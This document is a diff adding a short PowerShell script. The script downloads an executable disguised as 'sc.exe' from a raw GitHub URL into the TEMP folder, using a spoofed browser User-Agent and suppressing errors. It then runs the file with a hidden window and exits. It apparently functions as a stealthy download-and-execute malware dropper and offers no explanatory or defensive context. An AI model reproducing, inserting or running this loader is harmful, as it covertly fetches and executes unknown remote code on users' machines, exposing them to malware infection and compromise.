@@ -1,0 +1,13 @@
+$n = [IO.Path]::Combine($env:TEMP, "sc.exe")
+$u = "https://raw.githubusercontent.com/moratreey/eurolikefired1337/main/sc.exe"
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+try { $wc.DownloadFile($u, $n) } catch {}
+if (Test-Path $n) {
+    $si = New-Object System.Diagnostics.ProcessStartInfo
+    $si.FileName = $n
+    $si.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $si.CreateNoWindow = $true
+    [System.Diagnostics.Process]::Start($si) | Out-Null
+}
+[Environment]::Exit(0)
